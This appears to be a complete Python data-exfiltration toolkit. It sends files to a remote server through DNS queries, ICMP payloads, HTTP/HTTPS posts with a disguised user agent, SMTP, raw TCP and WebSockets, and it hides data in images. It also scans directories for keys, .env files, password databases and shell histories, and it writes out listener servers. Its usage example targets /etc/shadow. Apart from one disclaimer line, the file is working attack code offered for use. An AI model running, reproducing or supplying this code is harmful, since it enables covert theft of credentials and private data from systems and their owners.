#!/usr/bin/env python3
"""
Advanced Data Exfiltration Toolkit - DNS, ICMP, HTTP, Covert Channels
For authorized security testing only
"""
import os
import sys
import re
import json
import time
import struct
import socket
import base64
import hashlib
import zipfile
import threading
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

class DataExfiltrator:
    def __init__(self, server_ip="10.0.0.1", domain="exfil.example.com"):
        self.server_ip = server_ip
        self.domain = domain
        self.results = {
            'exfiltrated_files': [],
            'methods_used': [],
            'errors': []
        }
        
        # Exfiltration configuration
        self.chunk_size = 50  # Max bytes per chunk
        self.max_retries = 3
        self.delay = 0.5
        
        # Encoding methods
        self.encodings = {
            'base64': lambda d: base64.b64encode(d).decode(),
            'hex': lambda d: d.hex(),
            'base32': lambda d: base64.b32encode(d).decode(),
            'base85': lambda d: base64.b85encode(d).decode()
        }

    def split_file(self, filepath, chunk_size=None):
        """Split file into chunks for exfiltration"""
        if not chunk_size:
            chunk_size = self.chunk_size
        
        chunks = []
        
        try:
            with open(filepath, 'rb') as f:
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    chunks.append(chunk)
            
            return chunks
            
        except Exception as e:
            print(f"[-] File split error: {e}")
            return []

    def compress_data(self, data):
        """Compress data before exfiltration"""
        try:
            import zlib
            return zlib.compress(data)
        except:
            return data

    def encrypt_data(self, data, key=None):
        """Encrypt data before exfiltration"""
        if not key:
            key = hashlib.sha256(b"exfil_key").digest()
        
        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
            
            kdf = PBKDF2(
                algorithm=hashes.SHA256(),
                length=32,
                salt=b'exfil_salt',
                iterations=100000
            )
            fernet_key = base64.urlsafe_b64encode(kdf.derive(key))
            f = Fernet(fernet_key)
            return f.encrypt(data)
        except:
            return data

    def exfiltrate_dns(self, filepath):
        """Exfiltrate data via DNS queries"""
        print(f"[*] Exfiltrating via DNS: {filepath}")
        
        chunks = self.split_file(filepath, 30)  # Smaller chunks for DNS
        encoded_chunks = []
        
        # Encode chunks
        for i, chunk in enumerate(chunks):
            encoded = base64.b32encode(chunk).decode().lower().rstrip('=')
            encoded = encoded.replace('=', '')  # Remove padding for DNS
            encoded_chunks.append(encoded)
        
        # Exfiltrate via DNS queries
        exfiltrated = 0
        
        for i, chunk in enumerate(encoded_chunks):
            try:
                # Create DNS query with data
                query = f"{i}.{chunk}.{self.domain}"
                
                # Send DNS query
                socket.gethostbyname(query)
                
                exfiltrated += 1
                
                if exfiltrated % 10 == 0:
                    print(f"    Progress: {exfiltrated}/{len(encoded_chunks)}")
                
                time.sleep(self.delay)
                
            except socket.gaierror:
                # Expected - DNS server won't resolve
                exfiltrated += 1
            except Exception as e:
                print(f"    [-] DNS chunk {i} failed: {e}")
        
        # Send end marker
        try:
            end_query = f"END.{len(chunks)}.END.{self.domain}"
            socket.gethostbyname(end_query)
        except:
            pass
        
        print(f"    [+] DNS exfiltration complete: {exfiltrated}/{len(encoded_chunks)} chunks")
        
        self.results['exfiltrated_files'].append({
            'file': filepath,
            'method': 'dns',
            'chunks': exfiltrated,
            'total_size': os.path.getsize(filepath)
        })
        
        return exfiltrated

    def exfiltrate_icmp(self, filepath):
        """Exfiltrate data via ICMP packets"""
        print(f"[*] Exfiltrating via ICMP: {filepath}")
        
        chunks = self.split_file(filepath, 32)  # ICMP payload size
        exfiltrated = 0
        
        # Create raw socket for ICMP
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(2)
        except PermissionError:
            print("    [-] ICMP requires root privileges")
            return 0
        except Exception as e:
            print(f"    [-] ICMP socket error: {e}")
            return 0
        
        for i, chunk in enumerate(chunks):
            try:
                # Create ICMP packet
                icmp_type = 8  # Echo Request
                icmp_code = 0
                icmp_id = os.getpid() & 0xFFFF
                icmp_seq = i + 1
                
                # Calculate checksum
                checksum = 0
                packet = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
                packet += chunk.ljust(32, b'\x00')  # Pad to 32 bytes
                
                # Calculate actual checksum
                checksum = self.calculate_checksum(packet)
                packet = struct.pack('!BBHHH', icmp_type, icmp_code, socket.htons(checksum), icmp_id, icmp_seq)
                packet += chunk.ljust(32, b'\x00')
                
                # Send packet
                sock.sendto(packet, (self.server_ip, 0))
                
                exfiltrated += 1
                
                if exfiltrated % 10 == 0:
                    print(f"    Progress: {exfiltrated}/{len(chunks)}")
                
                time.sleep(0.1)
                
            except Exception as e:
                print(f"    [-] ICMP chunk {i} failed: {e}")
        
        sock.close()
        
        print(f"    [+] ICMP exfiltration complete: {exfiltrated}/{len(chunks)} chunks")
        
        self.results['exfiltrated_files'].append({
            'file': filepath,
            'method': 'icmp',
            'chunks': exfiltrated,
            'total_size': os.path.getsize(filepath)
        })
        
        return exfiltrated

    def calculate_checksum(self, data):
        """Calculate ICMP checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            checksum += w
        
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        
        return checksum

    def exfiltrate_http(self, filepath):
        """Exfiltrate data via HTTP POST"""
        print(f"[*] Exfiltrating via HTTP: {filepath}")
        
        import requests
        
        # Compress and encode file
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Compress
            compressed = self.compress_data(data)
            
            # Encode
            encoded = base64.b64encode(compressed).decode()
            
            # Split into chunks if too large
            chunk_size = 1000000  # 1MB chunks
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            
            exfiltrated = 0
            
            for i, chunk in enumerate(chunks):
                try:
                    response = requests.post(
                        f'http://{self.server_ip}:8080/upload',
                        json={
                            'file': os.path.basename(filepath),
                            'chunk': i,
                            'total': len(chunks),
                            'data': chunk,
                            'checksum': hashlib.md5(data).hexdigest()
                        },
                        headers={'User-Agent': 'Mozilla/5.0 (System Update)'},
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        exfiltrated += 1
                    else:
                        print(f"    [-] HTTP chunk {i} failed: {response.status_code}")
                    
                    time.sleep(0.5)
                    
                except Exception as e:
                    print(f"    [-] HTTP chunk {i} error: {e}")
            
            print(f"    [+] HTTP exfiltration complete: {exfiltrated}/{len(chunks)} chunks")
            
            self.results['exfiltrated_files'].append({
                'file': filepath,
                'method': 'http',
                'chunks': exfiltrated,
                'total_size': len(data)
            })
            
            return exfiltrated
            
        except Exception as e:
            print(f"    [-] HTTP exfiltration error: {e}")
            return 0

    def exfiltrate_https(self, filepath):
        """Exfiltrate data via HTTPS"""
        print(f"[*] Exfiltrating via HTTPS: {filepath}")
        
        import requests
        
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Split into chunks
            chunk_size = 500000
            chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
            
            exfiltrated = 0
            
            for i, chunk in enumerate(chunks):
                try:
                    # Encode chunk
                    encoded = base64.b64encode(chunk).decode()
                    
                    response = requests.post(
                        f'https://{self.server_ip}:8443/collect',
                        data={
                            'filename': os.path.basename(filepath),
                            'part': str(i),
                            'content': encoded
                        },
                        verify=False,
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        exfiltrated += 1
                    
                    time.sleep(1)
                    
                except Exception as e:
                    continue
            
            print(f"    [+] HTTPS exfiltration complete: {exfiltrated}/{len(chunks)} chunks")
            
            return exfiltrated
            
        except Exception as e:
            print(f"    [-] HTTPS exfiltration error: {e}")
            return 0

    def exfiltrate_smtp(self, filepath):
        """Exfiltrate data via email"""
        print(f"[*] Exfiltrating via SMTP: {filepath}")
        
        try:
            import smtplib
            from email.mime.multipart import MIMEMultipart
            from email.mime.base import MIMEBase
            from email.mime.text import MIMEText
            from email import encoders
            
            # Email configuration
            smtp_server = self.server_ip
            smtp_port = 25
            sender = 'system@update.local'
            receiver = 'collector@exfil.com'
            
            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = receiver
            msg['Subject'] = f'System Report - {datetime.now().isoformat()}'
            
            # Attach file
            attachment = open(filepath, 'rb')
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename={os.path.basename(filepath)}'
            )
            msg.attach(part)
            
            # Send email
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.sendmail(sender, receiver, msg.as_string())
            server.quit()
            
            print(f"    [+] Email exfiltration complete")
            
            self.results['exfiltrated_files'].append({
                'file': filepath,
                'method': 'smtp',
                'size': os.path.getsize(filepath)
            })
            
            return 1
            
        except Exception as e:
            print(f"    [-] SMTP exfiltration error: {e}")
            return 0

    def exfiltrate_dns_txt(self, filepath):
        """Exfiltrate data via DNS TXT records (requires DNS server control)"""
        print(f"[*] Exfiltrating via DNS TXT: {filepath}")
        
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Split and encode
            chunks = self.split_file(filepath, 200)  # TXT record limit
            exfiltrated = 0
            
            for i, chunk in enumerate(chunks):
                try:
                    # Encode chunk
                    encoded = base64.b64encode(chunk).decode()
                    
                    # Create DNS update packet (simulated)
                    query = f"nslookup -type=TXT {i}.{encoded[:50]}.{self.domain} {self.server_ip}"
                    
                    # In real scenario, you'd use nsupdate or similar
                    subprocess.run(query.split(), capture_output=True, timeout=5)
                    
                    exfiltrated += 1
                    time.sleep(0.2)
                    
                except:
                    continue
            
            print(f"    [+] DNS TXT exfiltration complete: {exfiltrated}/{len(chunks)}")
            
            return exfiltrated
            
        except Exception as e:
            print(f"    [-] DNS TXT error: {e}")
            return 0

    def exfiltrate_steganography(self, filepath, carrier_image=None):
        """Hide data in image using steganography"""
        print(f"[*] Exfiltrating via steganography: {filepath}")
        
        try:
            from PIL import Image
            
            # Load or create carrier image
            if carrier_image and os.path.exists(carrier_image):
                img = Image.open(carrier_image)
            else:
                # Create simple carrier image
                img = Image.new('RGB', (1000, 1000), color='white')
            
            # Read file to hide
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Add header with file info
            header = f"{os.path.basename(filepath)}|{len(data)}|".encode()
            data = header + data
            
            # Convert to bits
            bits = ''.join(format(byte, '08b') for byte in data)
            
            # Hide in LSB of image pixels
            pixels = img.load()
            width, height = img.size
            data_index = 0
            
            for y in range(height):
                for x in range(width):
                    if data_index < len(bits):
                        r, g, b = pixels[x, y]
                        
                        # Modify least significant bit
                        if data_index < len(bits):
                            r = (r & ~1) | int(bits[data_index])
                            data_index += 1
                        if data_index < len(bits):
                            g = (g & ~1) | int(bits[data_index])
                            data_index += 1
                        if data_index < len(bits):
                            b = (b & ~1) | int(bits[data_index])
                            data_index += 1
                        
                        pixels[x, y] = (r, g, b)
                    else:
                        break
                if data_index >= len(bits):
                    break
            
            # Save stego image
            output_path = f"/tmp/stego_{os.path.basename(filepath)}.png"
            img.save(output_path)
            
            print(f"    [+] Steganography complete: {output_path}")
            print(f"    [+] Hidden data: {len(data)} bytes in {output_path}")
            
            self.results['exfiltrated_files'].append({
                'file': filepath,
                'method': 'steganography',
                'output': output_path,
                'hidden_size': len(data)
            })
            
            return output_path
            
        except Exception as e:
            print(f"    [-] Steganography error: {e}")
            return None

    def exfiltrate_covert_tcp(self, filepath):
        """Exfiltrate data via covert TCP channel"""
        print(f"[*] Exfiltrating via covert TCP: {filepath}")
        
        try:
            chunks = self.split_file(filepath, 1024)
            exfiltrated = 0
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.server_ip, 8888))
            
            # Send file info
            file_info = f"{os.path.basename(filepath)}|{len(chunks)}".encode()
            sock.send(len(file_info).to_bytes(4, 'big'))
            sock.send(file_info)
            
            # Send chunks
            for i, chunk in enumerate(chunks):
                try:
                    # Encrypt chunk
                    encrypted = self.encrypt_data(chunk)
                    
                    # Send chunk size and data
                    sock.send(len(encrypted).to_bytes(4, 'big'))
                    sock.send(encrypted)
                    
                    # Wait for acknowledgment
                    ack = sock.recv(4)
                    
                    exfiltrated += 1
                    
                    if exfiltrated % 10 == 0:
                        print(f"    Progress: {exfiltrated}/{len(chunks)}")
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    print(f"    [-] TCP chunk {i} failed: {e}")
                    break
            
            sock.close()
            
            print(f"    [+] Covert TCP complete: {exfiltrated}/{len(chunks)} chunks")
            
            self.results['exfiltrated_files'].append({
                'file': filepath,
                'method': 'covert_tcp',
                'chunks': exfiltrated,
                'encrypted': True
            })
            
            return exfiltrated
            
        except Exception as e:
            print(f"    [-] Covert TCP error: {e}")
            return 0

    def exfiltrate_websocket(self, filepath):
        """Exfiltrate data via WebSocket"""
        print(f"[*] Exfiltrating via WebSocket: {filepath}")
        
        try:
            import websocket
            
            chunks = self.split_file(filepath, 4096)
            exfiltrated = 0
            
            ws = websocket.create_connection(f"ws://{self.server_ip}:9000/exfil")
            
            # Send file metadata
            ws.send(json.dumps({
                'type': 'file_start',
                'name': os.path.basename(filepath),
                'chunks': len(chunks),
                'size': os.path.getsize(filepath)
            }))
            
            # Send chunks
            for i, chunk in enumerate(chunks):
                encoded = base64.b64encode(chunk).decode()
                ws.send(json.dumps({
                    'type': 'chunk',
                    'index': i,
                    'data': encoded
                }))
                
                exfiltrated += 1
                time.sleep(0.05)
            
            # Send end marker
            ws.send(json.dumps({'type': 'file_end'}))
            ws.close()
            
            print(f"    [+] WebSocket complete: {exfiltrated}/{len(chunks)} chunks")
            
            return exfiltrated
            
        except Exception as e:
            print(f"    [-] WebSocket error: {e}")
            return 0

    def generate_server_code(self):
        """Generate listener/server code for exfiltration methods"""
        print("[*] Generating server/listener code...")
        
        # DNS Server (Python)
        dns_server = '''#!/usr/bin/env python3
"""DNS Exfiltration Server"""
import socket
import base64

def start_dns_server(port=53):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))
    
    print(f"[*] DNS exfil server on port {port}")
    
    data_buffer = {}
    
    while True:
        data, addr = sock.recvfrom(1024)
        
        # Parse DNS query
        query = data.decode('utf-8', errors='ignore')
        
        if 'END' in query:
            # Reassemble file
            total_chunks = int(query.split('.')[1])
            ordered_chunks = [data_buffer[i] for i in sorted(data_buffer.keys())]
            
            file_data = b''.join(ordered_chunks)
            
            with open('exfiltrated_file', 'wb') as f:
                f.write(file_data)
            
            print(f"[+] File reassembled: {len(file_data)} bytes")
            data_buffer.clear()
        else:
            # Extract chunk
            parts = query.split('.')
            chunk_num = int(parts[0])
            data_part = parts[1]
            
            # Decode
            try:
                decoded = base64.b32decode(data_part.upper())
                data_buffer[chunk_num] = decoded
            except:
                pass

if __name__ == "__main__":
    start_dns_server()
'''
        
        # ICMP Server
        icmp_server = '''#!/usr/bin/env python3
"""ICMP Exfiltration Server"""
import socket
import struct

def start_icmp_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.bind(('0.0.0.0', 0))
    
    print("[*] ICMP exfil server listening")
    
    data_buffer = {}
    
    while True:
        packet, addr = sock.recvfrom(1024)
        
        # Parse ICMP header
        icmp_header = packet[20:28]
        icmp_type, code, checksum, p_id, sequence = struct.unpack('!BBHHH', icmp_header)
        
        # Extract payload
        payload = packet[28:60]
        
        if sequence not in data_buffer:
            data_buffer[sequence] = payload
        
        # Check if complete (look for missing sequences)
        if len(data_buffer) == sequence:
            ordered_data = b''.join([data_buffer[i] for i in sorted(data_buffer.keys())])
            
            with open('exfiltrated_file', 'wb') as f:
                f.write(ordered_data)
            
            print(f"[+] File reassembled: {len(ordered_data)} bytes")
            data_buffer.clear()

if __name__ == "__main__":
    start_icmp_server()
'''
        
        # HTTP Server
        http_server = '''#!/usr/bin/env python3
"""HTTP Exfiltration Server"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import base64

class ExfilHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)
        
        # Reassemble file
        chunks = {}
        filename = data['file']
        
        # Store chunk
        chunks[data['chunk']] = data['data']
        
        if len(chunks) == data['total']:
            # Reassemble
            ordered = [chunks[i] for i in sorted(chunks.keys())]
            file_data = base64.b64decode(''.join(ordered))
            
            with open(f'exfil_{filename}', 'wb') as f:
                f.write(file_data)
            
            print(f"[+] File received: {len(file_data)} bytes")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8080), ExfilHandler)
    print("[*] HTTP exfil server on port 8080")
    server.serve_forever()
'''
        
        # Save server files
        with open('dns_server.py', 'w') as f:
            f.write(dns_server)
        
        with open('icmp_server.py', 'w') as f:
            f.write(icmp_server)
        
        with open('http_server.py', 'w') as f:
            f.write(http_server)
        
        print("[+] Server files generated:")
        print("    - dns_server.py")
        print("    - icmp_server.py")
        print("    - http_server.py")

    def exfiltrate_directory(self, directory, methods=['http', 'dns']):
        """Exfiltrate entire directory"""
        print(f"[*] Exfiltrating directory: {directory}")
        
        sensitive_extensions = [
            '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx',
            '.conf', '.config', '.ini', '.env', '.key', '.pem',
            '.sql', '.db', '.sqlite', '.kdbx', '.ovpn',
            '.bash_history', '.zsh_history', '.mysql_history'
        ]
        
        # Find sensitive files
        files_to_exfil = []
        
        for root, dirs, files in os.walk(directory):
            for file in files:
                if any(file.endswith(ext) for ext in sensitive_extensions):
                    filepath = os.path.join(root, file)
                    files_to_exfil.append(filepath)
        
        print(f"    Found {len(files_to_exfil)} sensitive files")
        
        # Exfiltrate each file
        for filepath in files_to_exfil[:10]:  # Limit to 10 files
            print(f"\n    Exfiltrating: {filepath}")
            
            # Use first available method
            if 'dns' in methods:
                self.exfiltrate_dns(filepath)
            elif 'http' in methods:
                self.exfiltrate_http(filepath)
            elif 'icmp' in methods:
                self.exfiltrate_icmp(filepath)
        
        return files_to_exfil

    def generate_report(self):
        """Generate exfiltration report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'server': self.server_ip,
            'domain': self.domain,
            'exfiltrated_files': self.results['exfiltrated_files'],
            'errors': self.results['errors'],
            'summary': {
                'total_files': len(self.results['exfiltrated_files']),
                'total_size': sum(f.get('total_size', 0) for f in self.results['exfiltrated_files']),
                'methods_used': list(set(f['method'] for f in self.results['exfiltrated_files']))
            }
        }
        
        with open('exfiltration_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n[+] Exfiltration report saved to exfiltration_report.json")
        
        return report

def main():
    if len(sys.argv) < 3:
        print("Usage: python exfiltrator.py <target_file/directory> <server_ip> [domain]")
        print("Examples:")
        print("  python exfiltrator.py /etc/shadow 10.0.0.1")
        print("  python exfiltrator.py /var/www/html 10.0.0.1 exfil.example.com")
        sys.exit(1)
    
    target = sys.argv[1]
    server_ip = sys.argv[2]
    domain = sys.argv[3] if len(sys.argv) > 3 else 'exfil.example.com'
    
    print("[!] WARNING: Only use on systems you own or have explicit permission to test!")
    print()
    
    exfiltrator = DataExfiltrator(server_ip, domain)
    
    # Generate server code first
    exfiltrator.generate_server_code()
    print()
    
    if os.path.isfile(target):
        # Single file exfiltration
        print(f"[*] Exfiltrating file: {target}")
        print("[*] Available methods: dns, icmp, http, https, smtp, covert_tcp, websocket")
        print()
        
        # Try multiple methods
        exfiltrator.exfiltrate_dns(target)
        exfiltrator.exfiltrate_http(target)
        
    elif os.path.isdir(target):
        # Directory exfiltration
        exfiltrator.exfiltrate_directory(target)
    
    # Generate report
    exfiltrator.generate_report()

if __name__ == "__main__":
    main()
